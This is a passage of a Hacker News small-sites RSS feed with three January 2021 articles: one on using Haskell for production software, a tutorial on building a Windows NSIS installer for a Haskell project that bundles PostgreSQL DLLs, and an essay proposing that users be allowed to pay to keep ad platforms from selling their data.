<p>Now, not all tech giants are destined to become Lazy Giants. Microsoft, for example, is still learning from it’s rivals, producing quality software and hardware, and generally doing good work. Netflix, a more recent giant, is still focusing on the goal of bringing entertainment to the world, and they are thriving. </p>



<p>Overall, I think that all companies, not just tech companies, should start to worry when they stop trying to solve problems, and start trying to make money. Making money is not a reason for a company to exist, nor is it a fulfilling reason to get up in the morning. Solving problems, however, is both. </p>



<hr>



<p>Did you find this interesting? For an article about business strategy and psychology in your inbox every Monday, sign up below.</p>



	<div data-blog-id="150483802">
		<div>
			<form aria-describedby="wp-block-jetpack-mailchimp_consent-text">
				
				

				<p id="wp-block-jetpack-mailchimp_consent-text">
					By clicking submit, you agree to share your email address with me. No spam, unsubscribe whenever.				</p>

				
			</form>
			
				<p>
					Processing…				</p>
				<p>
					Success! You're on the list.				</p>
				<p>
					Whoops! There was an error and we couldn't process your subscription. Please reload the page and try again.				</p>

					</div>
	</div>
				</div><!-- .entry-content -->

			<!-- .entry-footer -->
	</article><!-- #post-## -->

				
			
		</main><!-- #main -->
	</div><!-- #primary -->


		</div></div>]]>
            </description>
            <link>https://callumacdonald.com/lazy-giants/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25726607</guid>
            <pubDate>Mon, 11 Jan 2021 09:27:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Haskell is our first choice for building production software systems]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25726588">thread link</a>) | @Albert_Camus
<br/>
January 11, 2021 | https://www.foxhound.systems/blog/why-haskell-for-production/ | <a href="https://web.archive.org/web/*/https://www.foxhound.systems/blog/why-haskell-for-production/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Haskell is the first programming language we reach for when we build production software systems. This likely seems unusual to anyone who only has a passing familiarity with the language. Haskell has a reputation for being an advanced language with a steep learning curve. It is also often thought of as a research language with limited practical utility.</p>
<p>While Haskell does have a very large surface area, with many concepts and a syntax that will feel unfamiliar to programmers coming from most other languages, it is unrivaled in the combination of developer productivity, code maintainability, software reliability, and performance that it offers. In this post I will cover some of the defining features of Haskell that make it an excellent, industrial-strength language that is well-suited for building commercial software, and why it is usually the first tool we consider using for new projects.</p>
<!--more-->
<h3 id="haskell-has-a-strong-static-type-system-that-prevents-errors-and-reduces-cognitive-load">Haskell has a strong static type system that prevents errors and reduces cognitive load</h3>
<p>Haskell has a very powerful static type system which serves as a programmer aid that catches and prevents many errors before code ever even runs. Many programmers encounter statically typed languages like Java or C++ and find that the compiler feels like an annoyance. By contrast, Haskell’s static type system, in conjunction with compile-time type checking, acts as an invaluable pair-programming buddy that gives instantaneous feedback during development.</p>
<p>There’s a far smaller cognitive load that needs to be maintained when writing Haskell than when writing in languages like Python, JavaScript, or PHP. Many concerns can be completely offloaded to the compiler rather than needing to be remembered by the programmer. For example, when writing Haskell, there’s no need to preemptively ask questions like:</p>
<ul>
<li>Do I need to check whether this field is null?</li>
<li>What if fields are missing from the request payload?</li>
<li>Has this string already been decoded to an integer?</li>
<li>What if this string can’t be decoded to an integer?</li>
<li>Will this operator implicitly convert this integer to a string?</li>
<li>Are these two values comparable?</li>
</ul>
<p>This is not to say that these are questions that never need answering in Haskell; it’s to say that the compiler will throw an error when you need to address one of these issues. For example, it’s possible that a Haskell program needs to handle values that are sometimes not present, but instead of setting any value to <code>NULL</code>, a Haskell programmer must use a <code>Maybe</code> type, which indicates that the value may not be there, and the compiler forces the programmer to explicitly handle the <code>Nothing</code> value; the case where the value is not present.</p>
<p>Haskell’s static type system also leads to other benefits. Haskell code uses type signatures that precede its functions and describe the types of each parameter and return value. For example, a signature like <code>Int -&gt; Int -&gt; Bool</code> indicates that a function takes two integers and returns a boolean value. Since these type signatures are checked and enforced by the compiler, this allows a programmer reading Haskell code to look only at type signatures when getting a sense of what a certain piece of code does. For example, one would not use the type signature above when looking for a function that manipulates strings, decodes JSON, or queries a database.</p>
<p>Type signatures can even be used to search through the entire corpus of Haskell code for a relevant function. Using <a href="https://hoogle.haskell.org/" target="_blank" rel="noopener">Hoogle</a>, Haskell’s API search, we can search for a type signature based off of functionality we know that we need. For example, if we need to convert an <code>Int</code> to a <code>Float</code>, we can search Hoogle for <code>Int -&gt; Float</code> (<a href="https://hoogle.haskell.org/?hoogle=Int+-%3E+Float" target="_blank" rel="noopener">search results</a>), which will point us to the aptly named <code>int2Float</code> function.</p>
<p>Haskell also lets us create polymorphic type signatures through the use of type variables, represented by lowercase type names. For example, a signature of <code>a -&gt; b -&gt; a</code> tells us that that the function takes two parameters of two arbitrary types, and returns a value that whose type is the same as the first parameter. Suppose we want to check whether an element is in a list. We’re looking for a function that takes an item to search for, a list of items, and returns a boolean. We don’t care about the type of the item, so long as the search item and the items in the list are of the same type. So we can search Hoogle for <code>a -&gt; [a] -&gt; Bool</code> (<a href="https://hoogle.haskell.org/?hoogle=a%20-%3E%20%5Ba%5D%20-%3E%20Bool" target="_blank" rel="noopener">search results</a>), which will point us to the <code>elem</code> function. Parametric types are an extremely powerful feature in Haskell and are what enable writing reusable code.</p>
<h3 id="haskell-enables-writing-code-that-is-composable-testable-and-has-predictable-side-effects">Haskell enables writing code that is composable, testable, and has predictable side-effects</h3>
<p>In addition to being statically typed, Haskell is a pure functional programming language. This is one of Haskell’s defining features and what the language is well known for, even amongst programmers that have only heard of Haskell but never used it. Writing in a pure functional style has many benefits, and is conducive to a well-organized code base.</p>
<p>The word “pure” in “pure functional programming” is significant. Purity in this sense means that the code we write is pure, or free of side-effects. Another term that describes this is <a href="https://en.wikipedia.org/wiki/Referential_transparency" target="_blank" rel="noopener">referential transparency</a>, or the property where any expression (e.g.&nbsp;a function call with a given list of parameters) can be replaced with its return value without changing the functionality of the code. This is only possible when such pure functions do not have side effects, such as creating files on the host system, running database queries, or making HTTP requests. Haskell’s type system imposes this sort of purity.</p>
<p>So does being pure mean that Haskell programs cannot have side effects? Certainly not—but it does mean that effects are pushed to the edge of our system. Any functions that perform I/O actions (such as querying a database or receiving HTTP requests) must have a return type that captures this. This means that type signatures like the ones we saw in the previous section (e.g.&nbsp;<code>Int -&gt; Float</code> or <code>a -&gt; [a] -&gt; Bool</code>) are indicators that the corresponding functions do not produce side effects, since <code>Float</code> and <code>Bool</code> are just primitive return types. For a contrasting example that includes a side effect, a function signature of <code>FilePath -&gt; IO String</code> indicates that the function takes a file path and performs an I/O action that returns a string (which is exactly what the <code>readFile</code> function does).</p>
<p>Another feature of a pure functional programming paradigm is higher-order functions, which are functions that take functions as parameters. One of the most commonly used higher-order functions is <code>fmap</code>, which applies a function to each value in a container (such as a list). For example, we can apply a function named <code>square</code>, which takes an integer and returns that integer multiplied by itself, to a list of integers to turn it into a list of squared integers:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>square ::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span></span>
<span id="cb1-2">square x <span>=</span> x <span>*</span> x</span>
<span id="cb1-3"></span>
<span id="cb1-4"><span>fmap</span> square [<span>1</span>,<span>2</span>,<span>3</span>,<span>4</span>,<span>5</span>] <span>-- returns [1,4,9,16,25]</span></span></code></pre></div>
<p>Code written in this style tends to be both composable and testable. This above example is trivial, but there are many applications of higher-order functions. For example, we can write a function like <code>renderPost</code> which takes a record of post data and returns the version of the post rendered in HTML. If we have a list of posts, we can run <code>fmap renderPost postList</code> to produce a list of rendered posts. Our <code>renderPost</code> function can be used in both the single case and the multi-post case without any changes, because composing it with <code>fmap</code> changes how we can apply it. We can also write tests for the <code>renderPost</code> function and compose it with <code>fmap</code> in our tests when validating the behavior for a list of posts.</p>
<h3 id="haskell-facilitates-rapid-development-worry-free-refactoring-and-excellent-maintainability">Haskell facilitates rapid development, worry-free refactoring, and excellent maintainability</h3>
<p>Through the combination of the aforementioned static types and pure functional style that Haskell has, developing software in Haskell tends to be very fast. One of the common development workflows we employ is relies on a tool called <a href="https://github.com/ndmitchell/ghcid" target="_blank" rel="noopener"><code>ghcid</code></a>, a simple command line tool that relies on the Haskell repl to automatically watch code for changes and incrementally recompile. This allows us to see any compiler errors in our code immediately after saving changes to a file. It’s not uncommon for us to open only a terminal with a text editor and <code>ghcid</code> while developing applications in Haskell.</p>
<p>While manually validating the results of our code is eventually necessary by refreshing a page in a browser or using a tool to validate a JSON endpoint, a lot of this can be deferred until the end of a programming session. Many of the would-be runtime errors a programmer would encounter when writing a web service in a language like Python or PHP are caught immediately and displayed as compiler errors by <code>ghcid</code>. This is a far cry from the need to switch to a browser window and refresh the page after making a change to some code, a development workflow that everyone who has worked on a web application is intimately familiar with.</p>
<p>Beyond the tight feedback loop during development, Haskell code is easy to refactor and modify. Like real world code written in any other language, such code written in Haskell is not write-only. It eventually will need to be maintained, updated, and extended, often by developers that are not the original authors of the code. With the aid of compile-time checking, many code refactors in Haskell become easy; a common refactoring workflow is to make a desired change in one location and then fix one compiler error at a time until the program compiles again. This is far easier than the equivalent changes in dynamically typed languages that offer no such assistance to the programmer.</p>
<p>Proponents of dynamically typed languages will often argue that automated tests supplant the need for compile-time type checking, and can help prevent errors as well. However, tests are not as powerful as type constraints. For tests to be effective, they must:</p>
<ol type="1">
<li>Actually be written, yet many real world code bases have limited testing</li>
<li>Make correct assertions</li>
<li>Be comprehensive (test a variety of inputs) …</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.foxhound.systems/blog/why-haskell-for-production/">https://www.foxhound.systems/blog/why-haskell-for-production/</a></em></p>]]>
            </description>
            <link>https://www.foxhound.systems/blog/why-haskell-for-production/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25726588</guid>
            <pubDate>Mon, 11 Jan 2021 09:24:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Create a Windows installer for your Haskell project]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25726367">thread link</a>) | @unhammer
<br/>
January 11, 2021 | https://blog.patchgirl.io/haskell/2020/10/30/windows-installer-for-haskell-software.html | <a href="https://web.archive.org/web/*/https://blog.patchgirl.io/haskell/2020/10/30/windows-installer-for-haskell-software.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>30 Oct 2020</span></p><p>In this blog post, I’ll try to explain how you can create a really simple installer for your Haskell software on Windows and how to deal with external dependencies.</p>



<p>Alright, let’s get started. We are going to build a simple installer. It will install a desktop shortcut as well as a link shortcut in the start menu.
We will be using <a href="https://docs.haskellstack.org/en/stable/README/">Stack</a> to build our Haskell project and <a href="https://nsis.sourceforge.io/Main_Page">NSIS</a> to write the installer.</p>

<blockquote>
  <p>Note: GHC 8.8.[2|3|4] as well as 8.10.[1|2] are broken on windows so while we wait for 8.10.3 to fix everything, we will have to use 8.6.5 for now.</p>
</blockquote>

<p>Distributing software with external dependencies is slightly more complicated but not uncommon. We will make our project use <a href="https://github.com/lpsmith/postgresql-simple/">postgresql-simple</a> so we can learn how to deal with dependencies <img title=":books:" alt=":books:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f4da.png" height="20" width="20"></p>

<p>I will assume you have Postgresql, Stack, and NSIS installed already! Also, I’ll be using Powershell as a terminal.</p>



<p>So let’s start by creating a simple dummy project: <code>stack new hello-world-app</code></p>

<p>As said before we want to use GHC 8.6.5 so let’s fix the resolver in <code>stack.yml</code>:</p>

<div><div><pre><code><span>resolver</span><span>:</span> <span>lts-14.27</span> <span># use ghc 8.6.5</span>

<span>packages</span><span>:</span>
<span>-</span> <span>.</span>
</code></pre></div></div>

<p>We also want to use postgresql-simple so let’s add a dependency in <code>package.yml</code>:</p>

<div><div><pre><code><span>dependencies</span><span>:</span>
<span>-</span> <span>base &gt;= 4.7 &amp;&amp; &lt; </span><span>5</span>
<span>-</span> <span>postgresql-simple</span>

<span>...</span>
</code></pre></div></div>

<p>Finally, we make our software use only one function which query our postgres DB just to make sure it’s running:</p>

<div><div><pre><code><span>{-# LANGUAGE OverloadedStrings   #-}</span>
<span>{-# LANGUAGE QuasiQuotes         #-}</span>
<span>{-# LANGUAGE ScopedTypeVariables #-}</span>

<span>module</span> <span>Lib</span>
    <span>(</span> <span>isPostgresRunning</span>
    <span>)</span> <span>where</span>

<span>import</span> <span>qualified</span> <span>Database.PostgreSQL.Simple</span>       <span>as</span> <span>PG</span>
<span>import</span>           <span>Database.PostgreSQL.Simple.SqlQQ</span>

<span>isPostgresRunning</span> <span>::</span> <span>IO</span> <span>()</span>
<span>isPostgresRunning</span> <span>=</span> <span>do</span>
  <span>password</span> <span>&lt;-</span> <span>getLine</span>
  <span>connection</span> <span>&lt;-</span> <span>PG</span><span>.</span><span>connect</span> <span>PG</span><span>.</span><span>defaultConnectInfo</span> <span>{</span> <span>PG</span><span>.</span><span>connectDatabase</span> <span>=</span> <span>""</span>
                                                 <span>,</span> <span>PG</span><span>.</span><span>connectUser</span> <span>=</span> <span>"postgres"</span>
                                                 <span>,</span> <span>PG</span><span>.</span><span>connectPort</span> <span>=</span> <span>5432</span>
                                                 <span>,</span> <span>PG</span><span>.</span><span>connectPassword</span> <span>=</span> <span>password</span>
                                                 <span>}</span>
  <span>_</span> <span>::</span> <span>[</span><span>PG</span><span>.</span><span>Only</span> <span>Int</span><span>]</span> <span>&lt;-</span> <span>PG</span><span>.</span><span>query_</span> <span>connection</span> <span>[</span><span>sql</span><span>|</span> SELECT 1 <span>|]</span>
  <span>return</span> <span>()</span>

</code></pre></div></div>

<p>Alright, next we build it with <code>stack build</code> and it should… not work…
Indeed, stack will fail something like:</p>
<div><div><pre><code>&lt;command line&gt;: can't load .so/.DLL for: C:/PROGRA~1/POSTGR~1/13/lib\libpq.dll (addDLL: C:\PROGRA~1\POSTGR~1\13\lib\libpq or dependencies not loaded. (Win32 er)

--  While building package hello-world-app-0.0.0 (scroll up to its section to see the error) using:
      C:\sr\setup-exe-cache\x86_64-windows\Cabal-simple_Z6RU0evB_2.4.0.1_ghc-8.6.5.exe --builddir=.stack-work\dist\e626a42b build lib:hello-world-app exe:hello-world-app-exe --ghc-options " -fdiagnostics-color=always"
    Process exited with code: ExitFailure 1
</code></pre></div></div>

<p>To build our project, stack is telling us that it needs <code>libpq.dll</code>. So let’s add the missing dependencies path to our path.
with Powershell you can use this command: <code>$env:Path += ";C:\Program Files\PostgreSQL\13\bin"</code>. It will temporarily modify the path variable for the current terminal.</p>

<blockquote>
  <p>Note: You can use <code>$env:path.split(";")</code> to print the current value for the PATH variable.</p>
</blockquote>

<p>Ok, now it should build without errors! We can try to execute it as well with: <code>stack exec hello-world-app-exe</code> and… tadaaa <img title=":tada:" alt=":tada:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png" height="20" width="20">, our project is running! We can save our work and call it a day? <img title=":blush:" alt=":blush:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f60a.png" height="20" width="20"></p>

<p>Well, not really no. We still need to build our installer…</p>



<p>I picked NSIS but you might want to investigate other tools as well (<a href="https://jrsoftware.org/isinfo.php">Inno Setup</a> to name one). NSIS documentation felt nice and the fact that it came with examples, tutorials and a simple compiler convinced me into using it.</p>

<p>The idea behind an installer is that you write a script that will explain how to install software. The syntax is quite low level but it’s not that hard either.</p>

<p>So let’s write a simple installer in <code>installer.nsi</code>:</p>

<div><div><pre><code><span># we start by defining variables</span>
<span>!</span><span>define</span> <span>APPNAME</span> <span>"Hello World"</span>
<span>!</span><span>define</span> <span>COMPANYNAME</span> <span>"BestCompanyEver"</span>

<span>!</span><span>define</span> <span>EXECUTABLE_NAME</span> <span>"hello-world-app-exe.exe"</span>
<span>!</span><span>define</span> <span>ICON_NAME</span> <span>"icon.ico"</span>

<span>!</span><span>define</span> <span>VERSIONMAJOR</span> <span>1</span>
<span>!</span><span>define</span> <span>VERSIONMINOR</span> <span>0</span>
<span>!</span><span>define</span> <span>VERSIONPATCH</span> <span>0</span>

<span># create a directory where we will put our assets (eg: image, executable, uninstaller, dependencies...)</span>
<span>InstallDir</span> <span>"$PROGRAMFILES</span><span>\$</span><span>{COMPANYNAME}</span><span>\$</span><span>{VERSIONMAJOR}.${VERSIONMINOR}.${VERSIONPATCH}"</span> <span>#(ie: C:\Program Files\BestCompanyEver\1.0.0\)</span>

<span># Define the installer name</span>
<span>outFile</span> <span>"hello-world-app-installer.exe"</span>

<span>section</span> <span>"install"</span>
	<span>setOutPath</span> <span>$INSTDIR</span>

    <span># copy the executable in the installation directory</span>
    <span>file</span> <span>$</span><span>{</span><span>EXECUTABLE_NAME</span><span>}</span>

	<span># create a start menu shortcut</span>
	<span>createShortCut</span> <span>"$SMPROGRAMS</span><span>\$</span><span>{COMPANYNAME}</span><span>\$</span><span>{APPNAME}.lnk"</span> <span>"$INSTDIR</span><span>\$</span><span>{EXECUTABLE_NAME}"</span> <span>""</span> <span>"$INSTDIR</span><span>\$</span><span>{ICON_NAME}"</span>
	<span># create a desktop shortcut</span>
    <span>createShortCut</span> <span>"$DESKTOP</span><span>\$</span><span>{APPNAME}.lnk"</span> <span>"$INSTDIR</span><span>\$</span><span>{EXECUTABLE_NAME}"</span> <span>""</span> <span>"$INSTDIR</span><span>\$</span><span>{ICON_NAME}"</span>
<span>sectionEnd</span>
</code></pre></div></div>

<p>Quite concise indeed! We only need to compile it now. We can use the NSIS compiler that will create a <code>hello-world-app-installer.exe</code>.
We can now run the installer and check that our shortcut has been created in the Desktop folder.</p>

<p>Is it done now?</p>

<p><img title=":heavy_check_mark:" alt=":heavy_check_mark:" src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png" height="20" width="20"> shortcuts have been created<br>
<img title=":heavy_check_mark:" alt=":heavy_check_mark:" src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png" height="20" width="20"> Installation directory has been created and our executable has been paste inside it<br>
<img title=":x:" alt=":x:" src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png" height="20" width="20"> It doesn’t run<br></p>

<p>Indeed, if you try to run the executable, a window should popup with a message like <code>The code execution cannot proceed because LIBPQ.dll was not found. Reinstalling the program may fix the problem.</code>. Which means it’s time to dive into the world of DLLs.</p>

<p>But wait something’s strange. When we executed our program earlier, it was working fine. So what happened meanwhile?<br>
Well, the reason it worked before was that we prefixed the command with <code>stack exec</code> which made sure the executable would find its required dependencies.</p>

<p>We can verify this quite easily.
Let’s copy our executable in a place we can access more easily first: <code>stack install</code>. <br>
For me it copied the executable here: <code>C:\Users\iori\AppData\Roaming\local\bin</code>.<br></p>

<p>Let’s cd inside this folder and run our executable without prefixing it with <code>stack exec</code>. We should see the same error message popping up.</p>

<p>Time to fix this by making sure our executable knows where to find the DLLs it depends on.</p>



<p><code>DLL</code> (dynamic link library) is our runtime dependencies. In our case, because we use <code>postgresql-simple</code>, our project requires some postgresql DLLs that we need to find.</p>

<h2 id="finding-the-required-dll">Finding the required DLL</h2>

<p>Many tools can help you list dependencies on windows like <a href="https://github.com/lucasg/Dependencies">Dependencies</a> or even <code>ldd</code> if you have <a href="https://cygwin.com/">cygwin</a> installed.
I chose to go with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process explorer</a> which can show the dependency of a running process.</p>

<p>So let’s run our project with: <code>stack exec hello-world-app-exe</code>
Then we should find our instance in Process explorer.</p>

<p><img src="https://blog.patchgirl.io/assets/img/process-explorer.png" alt="test"></p>

<p>By clicking <strong>View</strong> -&gt; <strong>DLL</strong>, we can list our program DLLs. We don’t need to take care of the DLLs that are in the <code>C:\Windows\System32</code>.
On the other hand, we see that our executable requires 5 postgresql DLL: <em>libpq</em>, <em>libcrypto</em>, <em>libiconv</em>, <em>libintl</em> and <em>libssl</em>.
Those are the DLLs we want for our program. So we can simply copy them into the root folder of our executable and now, running our program without prefixing with <code>stack exec</code> should work fine! <img title=":fireworks:" alt=":fireworks:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f386.png" height="20" width="20"></p>

<p>So are we done now? Not quite so, we still need to update the installer to take the DLLs into account.</p>

<h2 id="copying-dlls-with-nsis">Copying DLLs with NSIS</h2>

<p>We could copy them one by one with <code>File myDll.dll</code> but because we might have a lot of them, let’s just put all our assets into a folder and copy that folder:</p>

<pre><code>section "install"
	setOutPath $INSTDIR

    file "assets\"

    ...
sectionEnd
</code></pre>

<p>We can then, put our DLLs, icon, and executable into the assets/ folder and Now we are truly done! <img title=":sparkler:" alt=":sparkler:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f387.png" height="20" width="20"></p>

<h2 id="really-is-this-the-end">Really? Is this the end?</h2>

<p>Well, this post was intended to be simple but actually, you shouldn’t stop here. You should add to your installer an uninstaller that will take care of removing all the folders/files, shortcuts, and whatnot.</p>

<p>I invite you to read NSIS documentation for that <img title=":blue_book:" alt=":blue_book:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f4d8.png" height="20" width="20"></p>

<p>This example is available in the repo <a href="https://github.com/patchgirl/windows-haskell-installer-example">patchgirl/windows-haskell-installer-example</a></p>



<p>For a simple case like this one, writing an installer isn’t too hard. If you don’t need shortcuts/icons and would satisfy with a simple executable that you can run from a terminal, you might want to investigate:</p>
<ul>
  <li>
<a href="https://hackage.haskell.org/package/file-embed">file-embed</a> to embed any files (picture, documentation,…) within your executable</li>
  <li>
<a href="https://vrom911.github.io/blog/github-actions-releases">Vrom911 blog post</a> to generate executable from Github Action for MacOS/Windows/Linux</li>
  <li>
<a href="https://input-output-hk.github.io/haskell.nix/">Haskell.nix</a> to cross-compile your Haskell project with Nix</li>
</ul>

<p>Also, I haven’t tried it but there exists a Haskell package called <a href="https://hackage.haskell.org/package/nsis">nsis</a> which provides a more concise DSL to build your script.</p>

<p>I hope this article helps you write more Haskell on Windows!!</p>

<p><img title=":cactus:" alt=":cactus:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f335.png" height="20" width="20"></p>

</div>



    </div></div>]]>
            </description>
            <link>https://blog.patchgirl.io/haskell/2020/10/30/windows-installer-for-haskell-software.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25726367</guid>
            <pubDate>Mon, 11 Jan 2021 08:51:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Right to Pay for My Products]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25726205">thread link</a>) | @pheymann
<br/>
January 11, 2021 | https://paulheymann.de/essay/2021/01/08/the-right-to-pay-for-my-products.html | <a href="https://web.archive.org/web/*/https://paulheymann.de/essay/2021/01/08/the-right-to-pay-for-my-products.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  

  <p>Should we forbid personalised advertisement to gain back our attention, our data, our digital selves? Should we completely break the underlying economic machinery that fuels companies like Facebook, Twitter, and Google?  I think the answer to that has to be <em>No</em>.</p>

<p>Every now and then I have conversations or read comments about the negative impact of these companies on society. Their business model seems to be diametrical opposite to what we as individuals want. We want to stay in contact, find new friends or jobs, find the right answer to our questions. But they require us to hand over our personal life, be as much engaged with their platforms as possible, and to spent every waking minute acting, reacting, and being influenced. At least to me that doesn’t sound like a preferable nor even acceptable deal. But why is it, that we have this relationship? The answer probably is: “So we become more valuable to their actual users”: Other businesses and as it allegedly seems states. They are paying the bills, they are the ones who drive revenue. The more attention we focus on their products, the longer and more often we can be convinced to buy, vote, or behave. The more data is available about each one of us the better this influence is exercised, because it can be personalized.</p>

<p>But a growing tension between users and platforms seems to be an indicator that we don’t want our attention and data captured. We don’t want to be treated like the product and give a few entities the key to our personality. And I agree. But I disagree when it comes to some of the proposed solutions. Making their business model - personalized advertisement - illegal being one of the more prominent ideas. Or complete disallowing them to collect any data, which results in the same outcome. But to me proponents of these ideas disregard the value of the products too easily. Do you want to life without Google Search or the option to stay in contact with a remote friend through Facebook? I believe these products carry a lot of actual value, but we as users have an asymmetric relationship with them. We are not allowed to become the actual, paying customers. We can use their products without paying money, but we pay the price by being the product.</p>

<p>But why is that? Companies like Google and Facebook are brokerage platforms for attention. That is their main business model. Our attention is offered and someone else is buying it. But for some reason we ourselves cannot be that buyer and these companies don’t show any activity in rectifying our relationship. It seems we, as users of these products, have to claim the right to buy back our attention.</p>

<p>But how would such a right look like?</p>

<h2 id="a-draft-the-right-to-pay">A Draft: The Right to Pay</h2>
<h3 id="executive-summary">Executive summary</h3>
<ul>
  <li>Companies that sell data and attention of their users have to provide these users with an option to buy it back in the form of a payed contract that disallows the sale of personalised data and prohibits the inclusion of it in the data and attention bidding process to third parties. It basically reserves the right that users can buy back their digital profiles before it reaches the market.</li>
  <li>The contract also <em>disables notifications and data collection about the user</em> during the use of the product, but it can be enabled by user consent. Access to the product cannot be denied when no consent is given.</li>
  <li>Prices for such user contracts and the right to pay for a service is determined by the prices payed on the brokerage platform run by the company. A distinction can be made between different countries and an update needs to be done periodically, e.g. every year.</li>
</ul>

<h3 id="the-whole-story">The whole story</h3>
<p>Instead of keeping the brokerage side of their business, the core of their business model, closed to a few large buyers it has to be opened up to all their users. They have to provide users with a contract to pay for the services and products they use. At the same time that contract disallows the sale of personalised data and prohibits the inclusion of that person in any attention bidding process. Notifying users and collecting data on them is allowed but disabled by default. A user may still enable it to allow features like personalized recommendation or search to work properly, but it is opt-in. Denial of service when no consent is given is illegal.</p>

<p>That is the basic structure and idea behind a possible legislation that creates a right for us to not be the product. But of course it immediately creates a loophole: Such a contract can be made impractically expensive. Imagine you have to pay 100 USD a month to use Instagram. It is unlikely that anyone will subscribe to such a plan, especially when they can have it virtually for free. But what if that contract doesn’t state a specific price but allows users to bid for his or her own data and attention? Now the price that is being paid correlates to the actual market price of how much my digital me is worth. I can buy myself at market price.</p>

<p>What such a contract looks like in reality is of course unclear. There are many possible ways to construct it. Two potentially interesting ones are the following:</p>

<ul>
  <li>
    <p>The technically most complex and involved solution would require each user to actually partake in each auctions on him or her, define maximum bid limits and the like. It also requires a brokerage firm like Facebook to handle a significantly larger amount of participants in its trading system. Before it was a limited number of entities interested in such a purchase. Now the number potentially growths to millions of participants in the case of large social networks like Facebook or Instagram. Or billions if this legislation would be applied in most markets.</p>
  </li>
  <li>
    <p>A more practical solution is to calculate average yearly attention and data brokerage revenue generated per user in a specific region like a country. I presume they are producing comparable statistics already to gauge their business development and therefore having these numbers should come at a low cost. The cost for a user contract then is such a number. Let us assume Instagram in 2020 earned 20 USD per user per year in the US on average. In that case the right for a US user to buy back his or her attention and data is 20 USD for the next year 2021.</p>
  </li>
</ul>

<p>I personally think that a version of the latter is the way forward. It is simple for both the companies and users to enact, while still being close to the underlying idea of giving the user access to the brokerage system.</p>

<p>So far so good, but looking closely at the concept we should immediately see another problem: The future development of user data and attention prices after the right is implemented has the potential to break companies like Google or Facebook and our access to their products.</p>

<h3 id="the-impact-of-future-data-and-attention-prices-on-companies-survival">The impact of future data and attention prices on companies’ survival</h3>
<p>Obviously there are three ways where the price can go in the long run: up, down, or nowhere, meaning it stays the same. We actually don’t have to predict what will possibly happen to each and every company. Next to being impossible it isn’t required in the first place. We only have to make sure that no matter where these prices go that:</p>

<ol>
  <li>Brokerage companies do not end up in a trap created by such a contract so that they will die out eventually.</li>
  <li>User contract prices reach a level which is uneconomical for most individuals and therefore users are forced to accept that their data and attention is sold.</li>
</ol>



<h4 id="prices-go-up">Prices go up</h4>
<p>There can be many different reasons why that happens. Maybe the increased competition on the bidder side also increases the prices. There is less to buy but more demand. In the end, we don’t have to know the exact reason for the increase. We have to understand what the implications are on brokerage companies and users. For brokers it means increased revenue, because bid prices went up and they get a share of it. Users on the other hand have to pay more because their contracts are directly connected to bid prices. All in all revenues and profits of brokerage companies should develop with the price.</p>

<p>But what happens when the user contract prices reach a level where they become uneconomical. What consequence has that in the long run? People start to cancel their payed accounts with services like Instagram and switch to the user-as-a-product model, which cost them no money. But that means a decreasing number of user contracts, less competition, and probably a going back to the current status quo. At some point the user contract becomes attractive again. We would see a cyclic pattern of price swings coupled with users signing payed contracts and then leaving them again. Potentially a stable prices level would establish itself.</p>

<p>On the other hand, if prices are high based on independent reason the question can be stated: But for how long can that be? To pay significantly more means companies buying data and attention have to spend significantly more. They have to finance it from their revenue. To justify paying more their revenue has to increase, they have to reduce their profits, or run on debt. But as far as I can see it that should not lead to a relative long term price increase for user contract, relative to a user’s income, because it seems like an inflationary process to me.</p>

<h4 id="prices-go-down">Prices go down</h4>
<p>Again we can have many possible scenarios leading to this price development. The most obvious one is a behaviour we see during the early development of social networks: The value of its user’s data and attention growths with the size of the network. You can reach more people and by sheer size increase the chance to reach more of the right people. But decreasing the pool of possible users you can bid on we reverse the economic machinery behind such social networks. The more people buy their data and attention back the smaller the network seems to buyers and therefore holds less value.</p>

<p>Here, the situation is reversed compared to rising prices. Users experience cheaper and cheaper user contracts, which might even attract more to switch, …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://paulheymann.de/essay/2021/01/08/the-right-to-pay-for-my-products.html">https://paulheymann.de/essay/2021/01/08/the-right-to-pay-for-my-products.html</a></em></p>]]>
            </description>
            <link>https://paulheymann.de/essay/2021/01/08/the-right-to-pay-for-my-products.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25726205</guid>
            <pubDate>Mon, 11 Jan 2021 08:26:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running a Blog with iPad]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25726147">thread link</a>) | @prof18
<br/>
January 11, 2021 | https://www.marcogomiero.com/posts/2021/running-blog-ipad/ | <a href="https://web.archive.org/web/*/https://www.marcogomiero.com/posts/2021/running-blog-ipad/">archive.org</a>
